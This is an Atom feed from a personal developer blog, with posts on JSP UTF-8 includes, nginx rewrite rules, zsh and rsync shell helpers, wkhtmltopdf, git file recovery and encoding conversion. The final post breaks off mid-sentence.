<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>Pixelastic</title>
 <link href="http://blog.pixelastic.com/atom.xml" rel="self"/>
 <link href="http://blog.pixelastic.com/"/>
 <updated>2014-06-09T19:57:04+02:00</updated>
 <id>http://blog.pixelastic.com</id>
 <author>
   <name>Tim Carry</name>
 </author>

 
 <entry>
   <title>UTF-8 encoding for included .jsp files</title>
   <link href="http://blog.pixelastic.com/2014/01/07/utf-8-encoding-included-jsp-files/"/>
   <updated>2014-01-07T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2014/01/07/utf-8-encoding-included-jsp-files</id>
   <content type="html">&lt;p&gt;Today I had to split a gigantic &lt;code&gt;.jsp&lt;/code&gt; file into several smaller files. I used
the &lt;code&gt;&amp;lt;@include file=&amp;quot;./path/to/file.jsp&amp;quot;&amp;gt;&lt;/code&gt; syntax in order to do this.&lt;/p&gt;

&lt;p&gt;Unfortunatly, all the included files were displayed with garbage instead of
UTF-8 characters.&lt;/p&gt;

&lt;p&gt;So I ran the list of usual suspects : - &lt;code&gt;Content-Type:text/html;
charset=utf-8&lt;/code&gt; is correctly returned by my server. - &lt;code&gt;&amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;&lt;/code&gt;
is the first element of my &lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;. - No data is being fetched from a
database, so it cannot come from there. - All my files are correctly encoded
in UTF-8.&lt;/p&gt;

&lt;p&gt;Also, I added a &lt;code&gt;&amp;lt;%@ page contentType=&amp;quot;text/html; charset=UTF-8&amp;quot;
pageEncoding=&amp;quot;UTF-8&amp;quot;%&amp;gt;&lt;/code&gt; as the very first line of my main &lt;code&gt;index.jsp&lt;/code&gt;. I also
added the following code to &lt;code&gt;pom.xml&lt;/code&gt; to make &lt;code&gt;UTF-8&lt;/code&gt; the default encoding :
[...] UTF-8&lt;/p&gt;

&lt;p&gt;Any &lt;code&gt;UTF-8&lt;/code&gt; in the main &lt;code&gt;index.jsp&lt;/code&gt; was fine, but as soon as it was in an
included it was displayed as garbaged. At first, I manually added &lt;code&gt;&amp;lt;%@ page
pageEncoding=&amp;quot;UTF-8&amp;quot;%&amp;gt;&lt;/code&gt; to every included page and it fixed the issue. But as
I was dealing with dozen of included files, I needed a more generic solution.&lt;/p&gt;

&lt;p&gt;Turns out that I had to edit my &lt;code&gt;web.xml&lt;/code&gt; file and add the following
configuration :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;jsp-config&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;jsp-property-group&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;*.jsp&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;page-encoding&amp;gt;&lt;/span&gt;UTF-8&lt;span class=&quot;nt&quot;&gt;&amp;lt;/page-encoding&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/jsp-property-group&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/jsp-config&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And it worked !&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Understanding nginx location blocks and rewrite rules</title>
   <link href="http://blog.pixelastic.com/2013/09/27/understanding-nginx-location-blocks-rewrite-rules/"/>
   <updated>2013-09-27T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2013/09/27/understanding-nginx-location-blocks-rewrite-rules</id>
   <content type="html">&lt;p&gt;I recently moved a cakePHP website from an Apache server to an Nginx one. I
had to translate url rewriting rules from one syntax to the other, and here is
what I learned.&lt;/p&gt;

&lt;p&gt;First of all, Nginx internal logic for processing rewrite rules is not as
straightforward as Apache. In Apache, rules are processed in the order in
which they appear in your config file/&lt;code&gt;.htaccess&lt;/code&gt;. In Nginx, they follow a
more complex pattern.&lt;/p&gt;

&lt;h2&gt;Initial Apache rules&lt;/h2&gt;

&lt;p&gt;First of all, here are the (simplified) set of rules I had to convert :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-apache&quot; data-lang=&quot;apache&quot;&gt;&lt;span class=&quot;nb&quot;&gt;RewriteRule&lt;/span&gt; ^(css|js)/packed_(.*)$ $1/packed/$2 [L]

&lt;span class=&quot;nb&quot;&gt;RewriteRule&lt;/span&gt; ^files/([0-9]{4})/([0-9]{2})/([0-9]{2})/([[:alnum:]]{8}-[[:alnum:]]{4}-[[:alnum:]]{4}-[[:alnum:]]{4}-[[:alnum:]]{12})/(.*)\.(.{3,4})    &lt;span class=&quot;sx&quot;&gt;/files/&lt;/span&gt;$1/$2/$3/$4.$6 [L]

&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{REQUEST_FILENAME} !-d
&lt;span class=&quot;nb&quot;&gt;RewriteCond&lt;/span&gt; %{REQUEST_FILENAME} !-f
&lt;span class=&quot;nb&quot;&gt;RewriteRule&lt;/span&gt; ^(.*)$ index.php?url=$1 [QSA,L]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The first rule deals with compressed &lt;code&gt;css&lt;/code&gt; and &lt;code&gt;js&lt;/code&gt; files. Minified &lt;code&gt;css&lt;/code&gt; and
&lt;code&gt;js&lt;/code&gt; files are saved in &lt;code&gt;/css/packed/&lt;/code&gt; with a filename made of a md5 hash of
the original filenames and a timestamp. So a url of
&lt;code&gt;/css/packed_6e4f31ffc48b6_1330851887.css&lt;/code&gt; will actually return the file
located in &lt;code&gt;/css/packed/6e4f31ffc48b6_1330851887.css&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The second rule is about media files uploaded on the server. Each uploaded
file is stored in the &lt;code&gt;/files/&lt;/code&gt; directory, in a subfolder made from the
uploading date (like &lt;code&gt;/files/2012/08/25/&lt;/code&gt;). The actual file is given a UUID
when saved, and this UUID is used as its filename on disk. The rewrite rule
allow the use of any custom filename when linking the file. This helps for SEO
purposes as well as making it more user-friendly when we present a download to
our users.Â So
&lt;code&gt;/files/2012/08/25/50483446-4b00-4d5b-8498-763e45a3e447/Subscription_form.pdf&lt;/code&gt;
actually returns the file at
&lt;code&gt;/files/2012/09/06/50483446-4b00-4d5b-8498-763e45a3e447.pdf&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;And the last rule is the default cakePHP rewrite rule. It first checks if the
requested url points to an existing directory or file, and if not dispatch it
to the main entry point : &lt;code&gt;index.php&lt;/code&gt; with the requested url as a parameter.&lt;/p&gt;

&lt;h2&gt;Converting it to Nginx&lt;/h2&gt;

&lt;p&gt;Rewrite rules in Nginx are usually found in &lt;code&gt;location&lt;/code&gt; blocks. There are
several ways you can define a &lt;code&gt;location&lt;/code&gt; block, and it affects the order in
which the rules will be parsed.&lt;/p&gt;

&lt;p&gt;Nginx first checks for &lt;code&gt;location =&lt;/code&gt; blocks. Those blocks are used to catch an
exact match of the requested url. Once such a block is found, its content is
applied, and Nginx stops looking for more matches.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nginx&quot; data-lang=&quot;nginx&quot;&gt;&lt;span class=&quot;k&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/my-exact-file.html&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kn&quot;&gt;rewrite&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/my-exact-file.html&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;http://external-website.com/&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In this example, a request for &lt;code&gt;/my-exact-file.html&lt;/code&gt; will be redirected to
&lt;code&gt;http://external-website.com.&lt;/code&gt; Note that you need to repeat the url in both
the &lt;code&gt;location =&lt;/code&gt; block and the &lt;code&gt;rewrite&lt;/code&gt; rule.&lt;/p&gt;

&lt;p&gt;The &lt;code&gt;location =&lt;/code&gt; is of very limited use as it only accepts an exact match on a
string. Much more useful are the &lt;code&gt;location ~&lt;/code&gt; blocks that performs matches on
regex (and the &lt;code&gt;location ~*&lt;/code&gt; for a case-insensitive version).&lt;/p&gt;

&lt;p&gt;Such blocks are tested after the &lt;code&gt;location =&lt;/code&gt;ones, in the order they appear
in your configuration file. Once a block matches, Nginx applies its content
but does not stop. It keeps looking for other blocks that might match and
apply them. It&amp;#39;s up to you, in the block content, to define if the parsing
should stop, using the &lt;code&gt;break&lt;/code&gt; command.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nginx&quot; data-lang=&quot;nginx&quot;&gt;&lt;span class=&quot;k&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/(css|js)/packed_&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kn&quot;&gt;rewrite&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;^/(css|js)/packed_(.*)&lt;/span&gt;$ &lt;span class=&quot;s&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1/packed/$2&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/files&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kn&quot;&gt;rewrite&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;^/files/(.*)/(.*)/(.*)\.(.*)&lt;/span&gt;$ &lt;span class=&quot;s&quot;&gt;/files/&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1/$2.$4&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In the first rule I&amp;#39;m looking for any &lt;code&gt;/css/packed_*&lt;/code&gt; or &lt;code&gt;/js/packed_*&lt;/code&gt;
request, and converting them to &lt;code&gt;/css/packed/*&lt;/code&gt; or &lt;code&gt;/js/packed/*&lt;/code&gt;. Note the
use of backreferences in the rewrite using &lt;code&gt;$x&lt;/code&gt; variables. In the second rule
I simplified the original regex from Apache to catch the &lt;code&gt;/2012/08/23/&lt;/code&gt; in
&lt;code&gt;$1&lt;/code&gt;, the UUID in &lt;code&gt;$2&lt;/code&gt;, the filename in &lt;code&gt;$3&lt;/code&gt; and the extension in &lt;code&gt;$4&lt;/code&gt; and
rewriting the request to the correct file on disk.&lt;/p&gt;

&lt;p&gt;Both rewrites ends with the &lt;code&gt;break&lt;/code&gt; flag. It tells Nginx that it should stop
looking for other &lt;code&gt;location ~&lt;/code&gt; blocks matching the requested url and just
serve the file. Another useful flag is &lt;code&gt;last&lt;/code&gt;, which tells Nginx to restart
its whole url matching process from the beginning but this time using the
newly rewritten url.&lt;/p&gt;

&lt;p&gt;There is one last &lt;code&gt;location&lt;/code&gt; block that we can use, and it&amp;#39;s the simple
&lt;code&gt;location&lt;/code&gt;, without any prefix. These &lt;code&gt;location&lt;/code&gt; blocks will be checked last,
if no &lt;code&gt;location =&lt;/code&gt; orÂ &lt;code&gt;location ~&lt;/code&gt; had stopped the processing. They are
especially good for a last &amp;quot;catch all&amp;quot; solution, and we are going to use them
to dispatch urls to &lt;code&gt;index.php&lt;/code&gt;&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nginx&quot; data-lang=&quot;nginx&quot;&gt;&lt;span class=&quot;k&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kn&quot;&gt;try_files&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$uri&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;/index.php?url=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$request_uri&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Using &lt;code&gt;location /&lt;/code&gt;, we&amp;#39;ll catch any remaining requests. The &lt;code&gt;try_files&lt;/code&gt;
command will test every one of its arguments in order to see if they exist on
disk and serve them if they do. So in our example it will first check for the
requested uri, and if such a file exists, will serve it. Otherwise it will
simply dispatch it to the main &lt;code&gt;index.php&lt;/code&gt; with the requested url as an
argument and cakePHP will do the rest.&lt;/p&gt;

&lt;p&gt;There is one last thing we must do, it&amp;#39;s telling Nginx to pass any &lt;code&gt;.php&lt;/code&gt; file
to the PHP fastcgi. This is quite easy using a &lt;code&gt;location ~&lt;/code&gt; block matching any
&lt;code&gt;.php&lt;/code&gt; file. This will even apply to files served through &lt;code&gt;try_files&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-nginx&quot; data-lang=&quot;nginx&quot;&gt;&lt;span class=&quot;k&quot;&gt;location&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;~&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;\.php$&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kn&quot;&gt;fastcgi_pass&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;127.0.0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;9000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kn&quot;&gt;fastcgi_index&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;index.php&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kn&quot;&gt;fastcgi_intercept_errors&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kn&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;fastcgi.conf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Wrapping your mind around the order in which Nginx applies your rewrites is
not easy at first. I hope this post helped you making sense of it.&lt;/p&gt;

&lt;p&gt;Note that there also is the &lt;code&gt;location ^~&lt;/code&gt; block but I found it to be of very
limited used as its behavior can be replicated with the more generic &lt;code&gt;location
~&lt;/code&gt; blocks.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>TÃ©lÃ©charger ParisWeb 2012 sous forme de podcasts</title>
   <link href="http://blog.pixelastic.com/2013/09/09/telecharger-parisweb-2012-sous-forme-de-podcasts/"/>
   <updated>2013-09-09T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2013/09/09/telecharger-parisweb-2012-sous-forme-de-podcasts</id>
   <content type="html">&lt;p&gt;&lt;em&gt;Note for my English readers : In this post in French, I&amp;#39;m talking about how
to download the audio version of the ParisWeb 2012 talks. As those talks are
mostly in French, it wouldn&amp;#39;t make much sense for me to write about it in
English.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;J&amp;#39;ai ratÃ© ParisWeb 2012, mais comme je n&amp;#39;ai pas envie de complÃ©tement rater
tout ce qui a pu s&amp;#39;y Ãªtre dit, j&amp;#39;ai dÃ©cidÃ© de tÃ©lÃ©charger l&amp;#39;ensemble des
vidÃ©os des confÃ©rences, les convertir en audio et les Ã©couter sous forme de
podcast sur mon lecteur mp3.&lt;/p&gt;

&lt;p&gt;Heureusement, les gens de ParisWeb ont dÃ©jÃ  fait 90% du travail en proposant
sur le site officiel des liens vers l&amp;#39;ensemble des confÃ©rences en vidÃ©o sur
Dailymotion. AprÃ¨s, je n&amp;#39;ai eu qu&amp;#39;Ã  scripter rapidement un crawler qui
tÃ©lÃ©charge et convertit tout cela automatiquement.&lt;/p&gt;

&lt;p&gt;Vous pouvez trouver le code sur &lt;a href=&quot;https://gist.github.com/pixelastic/6494754&quot;&gt;ce
gist&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;TODO: Actuellement je tÃ©lÃ©charge la totalitÃ© de la vidÃ©o (pouvant atteindre
plusieurs Go) pour n&amp;#39;en extraire qu&amp;#39;un fichier audio de quelques dizaines de
Mo. De plus, l&amp;#39;audio ne semble pas correctement reconnaitre le stÃ©rÃ©o.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Commandline escaping magic</title>
   <link href="http://blog.pixelastic.com/2013/09/09/commandline-escaping-magic/"/>
   <updated>2013-09-09T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2013/09/09/commandline-escaping-magic</id>
   <content type="html">&lt;p&gt;Aren&amp;#39;t your tired of having to wrap your url in quotes when using &lt;code&gt;wget&lt;/code&gt; so
the various &lt;code&gt;&amp;amp;&lt;/code&gt; and &lt;code&gt;?&lt;/code&gt; do not mess up your terminal ?&lt;/p&gt;

&lt;p&gt;Well, I was, until I stumbled upon this god-send zsh magic : &lt;code&gt;url-quote-
magic&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Just initiate it in your &lt;code&gt;.zshrc&lt;/code&gt; with the following lines :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;autoload -U url-quote-magic
zle -N self-insert url-quote-magic
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;And now, everytime you type or paste a url in &lt;code&gt;wget&lt;/code&gt; it will automatically
escape the needed characters. It is quite clever and works with other commands
that would otherwise trigger your terminal globbing feature.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Alternate cp and mv commands using rsync</title>
   <link href="http://blog.pixelastic.com/2013/09/09/alternate-cp-mv-commands-rsync/"/>
   <updated>2013-09-09T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2013/09/09/alternate-cp-mv-commands-rsync</id>
   <content type="html">&lt;p&gt;Sometime you need to copy or move files, but preserve their ownership,
timestamp or simply want to update the changing bits instead of blindly moving
whole chunks of data.&lt;/p&gt;

&lt;p&gt;I have two simple aliases to do just that. Meet &lt;code&gt;rcp&lt;/code&gt; and &lt;code&gt;rmv&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;rcp&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; rsync -rahP --modify-window&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;s2&quot;&gt;&amp;quot;$@&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;rmv&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; rsync -rahP --modify-window&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 --prune-empty-dirs --remove-sent-files &lt;span class=&quot;s2&quot;&gt;&amp;quot;$@&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
compdef _cp rcp rmvÂ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;They are defined as functions and not aliases so I can define which completion
functions zsh will use (that&amp;#39;s the &lt;code&gt;compdef&lt;/code&gt; part). In that case, I want them
to use the same completion as for the basic &lt;code&gt;cp&lt;/code&gt; command.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Converting html files to pdf from the commandline</title>
   <link href="http://blog.pixelastic.com/2013/09/05/converting-html-files-pdf-commandline/"/>
   <updated>2013-09-05T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2013/09/05/converting-html-files-pdf-commandline</id>
   <content type="html">&lt;p&gt;When you need to convert an &lt;code&gt;html&lt;/code&gt; file to a &lt;code&gt;pdf&lt;/code&gt;, often the default &lt;code&gt;pdf&lt;/code&gt;
printer of your OS is enough. For those times when you need a much better
rendering, you need a better tool.&lt;/p&gt;

&lt;p&gt;I had to convert my &lt;code&gt;html&lt;/code&gt;/&lt;code&gt;css&lt;/code&gt; resume to a &lt;code&gt;pdf&lt;/code&gt; file today. The default
&lt;code&gt;pdf&lt;/code&gt; printer on Ubuntu was discarding the background color and adding useless
margins.&lt;/p&gt;

&lt;p&gt;I finally resorted to using
&lt;a href=&quot;http://code.google.com/p/wkhtmltopdf/&quot;&gt;wkhtmltopdf&lt;/a&gt;. It does the job, but
needs a few tweaks. First, you have to add &lt;code&gt;-T 0 -R 0 -B 0 -L 0&lt;/code&gt; to remove the
margins. Then, you have to use the &lt;code&gt;file://&lt;/code&gt; notation to target a local file.
Also, it does not understand the css properties &lt;code&gt;page-break-after&lt;/code&gt; nor &lt;code&gt;page-
break-before&lt;/code&gt;. I had to manually add padding in my elements to stop them from
being cut in between two pages.Â But worst of all, it chokes on UTF-8
characters in filenames.&lt;/p&gt;

&lt;p&gt;In the end, I wrote a small ruby wrapper around wkhtmltopdf to work around all
those issues for me and called it &lt;a href=&quot;https://github.com/pixelastic/oro%0Ashi/blob/master/scripts/bin/html2pdf&quot;&gt;html2pdf&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Preventing the Meta key from opening the dash in Unity Ubuntu</title>
   <link href="http://blog.pixelastic.com/2013/09/02/preventing-meta-key-opening-dash-unity-ubuntu/"/>
   <updated>2013-09-02T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2013/09/02/preventing-meta-key-opening-dash-unity-ubuntu</id>
   <content type="html">&lt;p&gt;Everytime I install Ubuntu on a fresh computer and try to define custom
keybindings that use the meta (ie. Windows) key, I run into issues.&lt;/p&gt;

&lt;p&gt;The Ubuntu UI uses the meta key to open what they call the &amp;quot;Dash&amp;quot;. I never use
it and want my meta key back to define my own keybindings.&lt;/p&gt;

&lt;p&gt;There is no way to disable it from the default Ubuntu options. You have to
install &lt;code&gt;compizconfig-settings-manager&lt;/code&gt; and launch it using &lt;code&gt;ccsm&lt;/code&gt;. There, go
to the Ubuntu Unity Plugin and disable the &amp;quot;Key to show the launcher&amp;quot; binding.&lt;/p&gt;

&lt;p&gt;You will now be free to use the meta key in your keybindings, again.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>git resurrect to bring back deleted files from the dead</title>
   <link href="http://blog.pixelastic.com/2013/09/02/git-resurrect-bring-deleted-files-dead/"/>
   <updated>2013-09-02T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2013/09/02/git-resurrect-bring-deleted-files-dead</id>
   <content type="html">&lt;p&gt;Ever deleted a file several commits away and then suddenly realizing that you
actually need it ? Well, here&amp;#39;s an easy way to get your file back.&lt;/p&gt;

&lt;p&gt;First of all, we&amp;#39;ll get the commit in which the file has been deleted with :
&lt;code&gt;git log --diff-filter=D --format=format:%H -- {your_filename}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;--diff-filter=D&lt;/code&gt; will only keep commits where files gets deleted,
&lt;code&gt;--format=format:%H&lt;/code&gt; will only display the commit hashÂ and finally the &lt;code&gt;--&lt;/code&gt;
is a separator between your options and the argument. Argument should be your
filename, and it even accepts &lt;code&gt;*&lt;/code&gt; as a wildcard.&lt;/p&gt;

&lt;p&gt;Once you got the commit hash, it&amp;#39;s just a matter of checking the file out
using &lt;code&gt;git checkout {hash}~1 {your_filename}&lt;/code&gt;. The &lt;code&gt;~1&lt;/code&gt; targets the previous
commit, right before the file gets deleted.&lt;/p&gt;

&lt;p&gt;All wrapped up in a nice shell script, here is what it looks like :&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/env bash&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;filename&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# We first find the commit where the file was deleted&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;git log --diff-filter&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;D --format&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;format:%H -- &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# We then bring it back from the dead&lt;/span&gt;
git checkout &lt;span class=&quot;nv&quot;&gt;$hash&lt;/span&gt;~1 &lt;span class=&quot;nv&quot;&gt;$filename&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I&amp;#39;ve aliased mine to &lt;code&gt;git resurrect&lt;/code&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Renaming files to fit on a FAT32 drive</title>
   <link href="http://blog.pixelastic.com/2013/08/31/renaming-files-fit-fat32-drive/"/>
   <updated>2013-08-31T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2013/08/31/renaming-files-fit-fat32-drive</id>
   <content type="html">&lt;p&gt;When moving files from my hard-drive (formatted in ext3) to my mp3 music
player or to any drive formatted in FAT32, some files never get to the
destination due to illegal characters in their filename.&lt;/p&gt;

&lt;p&gt;Those includes characters like question marks, colons or quotes which can be
quite common in media filenames.&lt;/p&gt;

&lt;p&gt;So I wrote myself a &lt;a href=&quot;https://github.com/pixelastic/oroshi/blob/master/scripts/bin/rename-%0Afat32&quot;&gt;tiny command-line
script&lt;/a&gt; to make the filenames FTA32 compliant. Note that this is a destructive
operation as it will simply remove the illegal characters.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Converting files to UTF-8 from the command line</title>
   <link href="http://blog.pixelastic.com/2013/08/30/converting-files-utf-8-command-line/"/>
   <updated>2013-08-30T00:00:00+02:00</updated>
   <id>http://blog.pixelastic.com/2013/08/30/converting-files-utf-8-command-line</id>
   <content type="html">&lt;p&gt;Converting to and from charset encoding is boring. Life would be much easier
if everything was saved in proper UTF-8.&lt;/p&gt;

&lt;p&gt;I just coded a couple of scripts that will help be read file encoding from
files and convert them to UTF-8.&lt;/p&gt;

&lt;p&gt;First, not all encoding can be easily read. Some uses markers that are easy to
check, other requires heuristic and guessing. I won&amp;#39;t deal with the second
part. Most of the files I&amp;#39;m currently handling are either Latin1 (ISO-8859-1)
or Latin2 (ISO-8859-2), so I&amp;#39;ll limit the scope of my scripts to those two
sets.&lt;/p&gt;

&lt;p&gt;Fortunatly, the default &lt;code&gt;file&lt;/code&gt; command can do that.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file -bi file.txt
text/plain&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;us-ascii
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file -bi bad.html
text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;file -bi good.html
text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;utf-8
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Now that we have a way to know the input encoding, we can use &lt;code&gt;recode&lt;/code&gt; to
convert to UTF-8. You can install &lt;code&gt;recode&lt;/code&gt; easily with &lt;code&gt;sudo apt-get install
